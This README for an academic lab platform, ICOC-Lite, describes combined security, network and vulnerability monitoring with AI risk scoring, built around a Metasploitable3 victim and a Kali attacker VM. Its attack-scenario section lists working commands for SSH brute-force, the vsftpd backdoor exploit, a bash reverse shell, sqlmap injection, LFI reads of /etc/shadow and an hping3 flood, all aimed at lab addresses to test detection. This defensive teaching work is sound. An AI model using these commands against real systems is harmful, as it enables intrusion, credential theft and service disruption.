# ICOC-Lite — Integrated Cyber Operations Center

**Academic Virtualized Lab | Version 1.0 Final**

A unified SOC + NOC + VOC platform with AI-driven risk intelligence, built on a real virtualized attack lab.

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│  PHYSICAL NETWORK: 192.168.237.0/24                     │
│                                                         │
│  192.168.237.1    → Windows PC (Docker host)            │
│  192.168.237.129  → Metasploitable3 VM (victim)         │
│  192.168.237.131  → Kali Linux VM (attacker)            │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│  DOCKER INTERNAL NETWORK: 172.20.0.0/24                 │
│                                                         │
│  172.20.0.10  → PostgreSQL (ICOC database)              │
│  172.20.0.11  → PostgreSQL (Zabbix database)            │
│  172.20.0.20  → Zabbix Server                           │
│  172.20.0.21  → Zabbix Web UI  → http://localhost:8081  │
│  172.20.0.22  → Zabbix Agent                            │
│  172.20.0.30  → FastAPI backend → http://localhost:8000  │
│  172.20.0.40  → React frontend → http://localhost:3000  │
└─────────────────────────────────────────────────────────┘
```

---

## Prerequisites

- Docker Desktop for Windows (running)
- VirtualBox or VMware with:
  - Metasploitable3 VM at `192.168.237.129`
  - Kali Linux VM at `192.168.237.131`
- Both VMs on the same host-only network as the PC

---

## Full Setup — First Time

### Step 1 — Start the VMs

Start both VMs in VirtualBox/VMware and wait until fully booted.

Verify they are reachable from your PC:

```powershell
ping 192.168.237.129
ping 192.168.237.131
```

---

### Step 2 — Start the Docker Stack

```powershell
cd c:\Users\ahmed\Downloads\ICOC-ProjectFinal\ICOC-ProjectFinal

docker-compose down --remove-orphans
docker-compose up -d --build
```

Wait ~30 seconds, then verify all containers are healthy:

```powershell
docker-compose ps
docker exec icoc-api curl -s http://localhost:8000/health
```

Expected response: `{"status":"ok","db_connected":true}`

---

### Step 3 — Initialize the Database

```powershell
docker exec icoc-api python -c "import requests; r = requests.post('http://localhost:8000/db/init'); print(r.json())"
```

Expected: `{"status": "ok", "message": "Schema created and lab data seeded"}`

---

### Step 4 — Train the AI Models

With internet access (recommended — uses real NVD CVE data):

```powershell
docker exec icoc-api python ai/train.py --download
```

Without internet access (uses synthetic data):

```powershell
docker exec icoc-api python ai/train.py --synthetic
```

Verify all 3 models are ready:

```powershell
docker exec icoc-api python -c "import requests; print(requests.get('http://localhost:8000/ai/train-status').json())"
```

Expected: `"all_ready": true`

---

### Step 5 — Install the Victim Agent on Metasploitable3

The agent monitors SSH logs, file integrity, processes, and network connections in real time.
It runs on Python 2.7 with zero external dependencies — nothing needs to be installed on the VM first.

```powershell
docker cp victim/agent/agent_legacy.py icoc-api:/tmp/agent_legacy.py
docker cp victim/agent/install_agent.sh icoc-api:/tmp/install_agent.sh

docker exec icoc-api sshpass -p vagrant scp -o StrictHostKeyChecking=no /tmp/agent_legacy.py /tmp/install_agent.sh vagrant@192.168.237.129:/tmp/

docker exec icoc-api sshpass -p vagrant ssh -o StrictHostKeyChecking=no vagrant@192.168.237.129 "sudo bash /tmp/install_agent.sh"
```

Verify the agent is running and sending events (wait 15 seconds):

```powershell
Start-Sleep -Seconds 15
docker exec icoc-api python -c "import requests; d = requests.get('http://localhost:8000/events/stats').json(); print('total_events:', d['total_events'], '| types:', list(d['event_types'].keys()))"
```

Expected: `heartbeat` events appearing in the list.

Check agent logs directly on the VM:

```powershell
docker exec icoc-api sshpass -p vagrant ssh -o StrictHostKeyChecking=no vagrant@192.168.237.129 "tail -20 /var/log/icoc-agent.log"
```

---

### Step 6 — Run the Vulnerability Scan

Triggers a live nmap + vulners NSE scan against Metasploitable3.

```powershell
docker exec icoc-api python -c "import requests; r = requests.post('http://localhost:8000/voc/scan', json={'enrich_vt': False}); print(r.json())"
```

Poll progress until complete (takes ~2 minutes):

```powershell
docker exec icoc-api python -c "
import requests, time
while True:
    d = requests.get('http://localhost:8000/voc/scan/status').json()
    print('stage:', d.get('stage'), '| pct:', d.get('pct'), '| running:', d.get('running'))
    if not d.get('running') and d.get('pct') == 100:
        print('DONE:', d.get('last_result'))
        break
    time.sleep(5)
"
```

Expected result: `mode: live_nmap, total_vulns: 155`

---

### Step 7 — Verify Everything Updated

```powershell
docker exec icoc-api python -c "
import requests

stats = requests.get('http://localhost:8000/db/stats').json()
print('=== DATABASE ===')
print('patch_records:', stats['patch_records'])
print('cve_database: ', stats['cve_database'])
print('scan_reports: ', stats['scan_reports'])
print('security_events:', stats['security_events'])

print()
print('=== COMPLIANCE ===')
comp = requests.get('http://localhost:8000/voc/compliance').json()
for fw, d in comp['frameworks'].items():
    print(fw + ':', d['overall_score_pct'], '%', '-', d['status'])

print()
print('=== RISK SCORE ===')
risk = requests.get('http://localhost:8000/ai/risk-score').json()
print('score:', risk['score'], '/', risk['level'])
print('inputs:', risk['inputs'])
"
```

---

### Step 8 — Open the Dashboard

```
http://localhost:3000
```

| URL | Service |
|-----|---------|
| http://localhost:3000 | ICOC-Lite Dashboard |
| http://localhost:8000/docs | FastAPI Swagger UI |
| http://localhost:8081 | Zabbix Web UI (Admin / zabbix) |

---

## Daily Startup (VMs Already Configured)

Once the full setup is done, daily startup only needs:

```powershell
# 1. Start both VMs in VirtualBox/VMware

# 2. Start Docker stack
cd c:\Users\ahmed\Downloads\ICOC-ProjectFinal\ICOC-ProjectFinal
docker-compose up -d

# 3. Wait for healthy state
Start-Sleep -Seconds 30
docker exec icoc-api curl -s http://localhost:8000/health

# 4. Run a fresh vulnerability scan
docker exec icoc-api python -c "import requests; requests.post('http://localhost:8000/voc/scan', json={'enrich_vt': False})"

# 5. Open dashboard
start http://localhost:3000
```

The victim agent on Metasploitable3 starts automatically on boot via Upstart — no reinstall needed.

---

## Attack Scenarios from Kali Linux

SSH into Kali first:

```bash
ssh kali@192.168.237.131
# or open the Kali VM terminal directly
```

Each attack below triggers real-time SOC events visible in the dashboard.

---

### SSH Brute-Force
**Triggers:** `ssh_failed_auth`, `ssh_brute_force` (Critical after 5 attempts), `ssh_login_success`

```bash
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.237.129 -t 4 -V
```

---

### Port Scan
**Triggers:** `port_scan_detected`

```bash
nmap -sV -A 192.168.237.129
```

---

### Exploit vsftpd 2.3.4 Backdoor (Reverse Shell)
**Triggers:** `reverse_shell_detected`, `suspicious_process`

```bash
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.237.129; set PAYLOAD cmd/unix/interact; run"
```

---

### Metasploit Reverse Shell Handler
**Triggers:** `reverse_shell_detected`

```bash
# Terminal 1 — start listener on Kali
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST 192.168.237.131; set LPORT 4444; run"

# Terminal 2 — trigger reverse shell from victim (if you have a shell)
bash -i >& /dev/tcp/192.168.237.131/4444 0>&1
```

---

### SQL Injection
**Triggers:** `sqli_attack`

```bash
sqlmap -u "http://192.168.237.129/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" --dbs --batch
```

---

### Local File Inclusion (LFI)
**Triggers:** `lfi_attack`

```bash
curl "http://192.168.237.129/mutillidae/index.php?page=../../../../etc/passwd"
curl "http://192.168.237.129/mutillidae/index.php?page=../../../../etc/shadow"
```

---

### DoS Flood
**Triggers:** `dos_attack`

```bash
hping3 -S --flood -V -p 80 192.168.237.129
```

---

### Drop a File in /tmp (Malware Simulation)
**Triggers:** `suspicious_file_drop` (Critical — FIM monitor detects it)

```bash
# SSH into victim first, then:
ssh vagrant@192.168.237.129
echo '#!/bin/bash' > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh
```

---

### Modify a Watched System File (FIM Test)
**Triggers:** `file_integrity_violation` (Critical)

```bash
ssh vagrant@192.168.237.129
echo "# test" | sudo tee -a /etc/hosts
```

---

## What Updates After Each Scan

When you click **Run Full Scan** in the dashboard or trigger via API:

```
nmap scans 192.168.237.129 (ports 21,22,25,80,139,443,445,3306,5432,6667,8009,8080,8443)
    ↓
vulners NSE script maps service versions to CVEs
    ↓
patch_records table updated (new CVEs added, last_checked refreshed)
cve_database table updated
scan_reports saved to DB + disk JSON
    ↓
/voc/compliance recalculates PCI-DSS, ISO-27001, NIST-CSF scores
/ai/risk-score recalculates global risk (0-100)
/voc/patches updates vulnerability table
/dashboard refreshes all panels
```

---

## Functional Requirements Coverage

| ID | Requirement | Implementation |
|----|-------------|----------------|
| FR-SOC-01 | Centralized log collection | Victim agent → `/events/ingest` |
| FR-SOC-02 | Brute-force detection (5 failures/5min) | `event_store.py` SSH fail tracker |
| FR-SOC-03 | Severity classification | Critical/High/Medium/Low/Info |
| FR-SOC-04 | Automated IP blocking | `auto_block_triggered` flag in events |
| FR-SOC-05 | Incident reporting with IoCs | `/events/remediation/{id}` |
| FR-SOC-06 | File integrity monitoring | FIMMonitor in `agent_legacy.py` |
| FR-SOC-07 | Malware detection | `/tmp` file drop detection |
| FR-SOC-08 | User behavior analytics | ProcessMonitor suspicious process list |
| FR-NOC-01 | CPU monitoring (60s intervals) | Zabbix + agent heartbeat |
| FR-NOC-02 | Memory usage tracking | Agent heartbeat `/proc/meminfo` |
| FR-NOC-03 | Service availability monitoring | Zabbix ICMP/TCP/HTTP checks |
| FR-NOC-04 | Threshold-based alerting | Zabbix triggers |
| FR-NOC-05 | Uptime calculation | Zabbix |
| FR-NOC-06 | Network bandwidth monitoring | Agent heartbeat `/proc/net/dev` |
| FR-NOC-07 | Disk space monitoring | Agent heartbeat `df /` |
| FR-NOC-08 | Performance reporting | NOC tab charts |
| FR-VOC-01 | Software inventory | `/voc/inventory` SSH dpkg-query |
| FR-VOC-02 | CVSS v3.1 scoring | `/voc/cvss/{cve_id}` |
| FR-VOC-03 | Patch status tracking | `/voc/patches` |
| FR-VOC-04 | Vulnerability reports | `/voc/report` PDF/CSV/JSON |
| FR-VOC-05 | Scheduled & on-demand scanning | `/voc/scan` nmap + vulners |
| FR-VOC-06 | NVD/CVE database integration | `/voc/nvd/{cve_id}` |
| FR-VOC-07 | Compliance framework mapping | `/voc/compliance` PCI-DSS/ISO/NIST |
| FR-AI-01 | Global risk score (0-100) | `/ai/risk-score` |
| FR-AI-02 | ML-based alert prioritization | `/ai/prioritize` |
| FR-AI-03 | Cross-domain SOC × VOC correlation | `/ai/correlate` |
| FR-AI-04 | Real-time risk updates (<30s) | `/ai/risk-stream` SSE |
| FR-AI-05 | Threat intelligence feed | `/ai/threat-intel` CISA KEV live |
| FR-AI-06 | Predictive incident analytics | `/ai/predict-incident` |
| FR-AI-07 | Automated response recommendations | `/ai/recommendations` |

---

## Troubleshooting

**Docker containers not starting:**
```powershell
docker-compose logs api
docker-compose logs db
```

**Agent not sending events:**
```powershell
docker exec icoc-api sshpass -p vagrant ssh -o StrictHostKeyChecking=no vagrant@192.168.237.129 "sudo status icoc-agent; tail -20 /var/log/icoc-agent.log"
```

**Scan returns 0 vulnerabilities:**
```powershell
# Verify VM is reachable from API container
docker exec icoc-api curl -s --connect-timeout 5 http://192.168.237.129 -o /dev/null -w "%{http_code}"
# Should return 200
```

**CVE table empty after scan:**
```powershell
docker exec icoc-api python -c "import requests; print(requests.post('http://localhost:8000/db/reseed').json())"
```

**Retrain AI models:**
```powershell
docker exec icoc-api python ai/train.py --download
```

**Full reset (wipe DB and rescan):**
```powershell
docker-compose down -v
docker-compose up -d --build
# Then repeat Steps 3-6
```

---

## Project Structure

```
ICOC-ProjectFinal/
├── main.py                    # FastAPI application entry point
├── database.py                # PostgreSQL connection and queries
├── event_routes.py            # SOC event ingestion endpoints
├── event_store.py             # In-memory event cache + deduplication
├── docker-compose.yml         # Full stack orchestration
├── .env                       # Environment configuration
│
├── voc/                       # Vulnerability Operations Center
│   ├── fr_voc_01_inventory.py     # Software inventory via SSH
│   ├── fr_voc_02_cvss_scoring.py  # CVSS v3.1 calculator
│   ├── fr_voc_03_patch_tracking.py # Patch status management
│   ├── fr_voc_04_reports.py       # Report generation
│   ├── fr_voc_05_scanner.py       # nmap + vulners live scanner
│   ├── fr_voc_06_nvd_integration.py # NVD API integration
│   ├── fr_voc_07_compliance.py    # PCI-DSS / ISO-27001 / NIST-CSF
│   └── data/
│       ├── patch_status.json      # Persistent patch records
│       ├── scans/                 # Scan result JSON files
│       └── nvd_cache/             # NVD CVE cache
│
├── ai/                        # AI Risk Engine
│   ├── fr_ai_01_risk_score.py     # Global risk score (0-100)
│   ├── fr_ai_02_ml_prioritization.py # ML alert prioritization
│   ├── fr_ai_03_correlation.py    # SOC x VOC correlation
│   ├── fr_ai_05_07.py             # Threat intel / prediction / recommendations
│   ├── train.py                   # Model training pipeline
│   └── models/
│       ├── exploitability_model.py
│       ├── severity_classifier.py
│       ├── anomaly_detector.py
│       └── saved/                 # Trained .pkl model files
│
├── noc/                       # Network Operations Center
│   ├── noc_api.py                 # Zabbix API integration
│   ├── noc_alerts.py              # Alert management
│   ├── noc_metrics.py             # Performance metrics
│   └── ...
│
├── victim/
│   └── agent/
│       ├── agent_legacy.py        # Python 2.7 compatible victim agent
│       └── install_agent.sh       # Agent installer for Metasploitable3
│
├── attacker/
│   ├── attacker_server.py         # Attack orchestration server (Kali)
│   └── attacks.py                 # Attack implementations
│
├── frontend/
│   └── src/
│       └── App.jsx                # React dashboard
│
└── docker/
    ├── Dockerfile.api
    ├── Dockerfile.frontend
    └── init_db.sql
```

---

*ICOC-Lite — Academic Virtualized Lab | February 2026*
